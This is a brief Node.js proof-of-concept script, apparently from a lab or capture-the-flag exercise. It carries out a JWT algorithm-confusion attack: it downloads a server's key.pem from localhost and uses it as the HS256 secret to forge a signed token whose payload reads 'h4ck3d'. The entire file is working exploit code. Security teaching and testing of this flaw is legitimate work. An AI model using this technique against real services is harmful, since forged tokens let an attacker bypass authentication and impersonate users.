const jwt = require('jwt-simple');
const fs = require('fs');
const fetch = require('node-fetch');

(async () => {
  const payload = {
    "message": "h4ck3d",
  };
  // const secret = fs.readFileSync('key.pem');
  const secret = await (await fetch('http://localhost:8080/key.pem')).text();
  console.log(secret.toString());
  const token = jwt.encode(payload, secret, 'HS256');
  console.log(token);
})();